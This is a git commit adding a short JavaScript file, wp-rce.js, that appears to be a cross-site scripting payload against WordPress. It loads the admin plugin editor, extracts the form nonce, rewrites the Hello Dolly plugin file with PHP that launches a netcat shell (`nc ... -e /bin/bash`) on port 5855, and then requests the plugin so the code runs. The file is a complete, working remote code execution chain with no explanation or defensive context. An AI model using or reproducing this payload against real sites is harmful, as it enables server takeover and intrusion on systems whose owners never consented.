d870ff08a2ee729640b660beb70c168fe43a3642
JeffreyShran <10995361+JeffreyShran@users.noreply.github.com>
2020-10-28 11:42:18 +0000

    Create wp-rce.js

---
+++ wp-rce.js
@@ -0,0 +1,21 @@
+p = '/wordpress/wp-admin/plugin-editor.php?';
+q = 'file=hello.php';
+s = '<?=`nc localhost 5855 -e /bin/bash`;';
+
+a = new XMLHttpRequest();
+a.open('GET', p+q, 0);
+a.send();
+
+$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
+'&newcontent=' + s + '&action=update&' + q;
+
+b = new XMLHttpRequest();
+b.open('POST', p+q, 1);
+b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+b.send($);
+
+b.onreadystatechange = function(){
+   if (this.readyState == 4) {
+      fetch('/wordpress/wp-content/plugins/hello.php');
+   }
+}
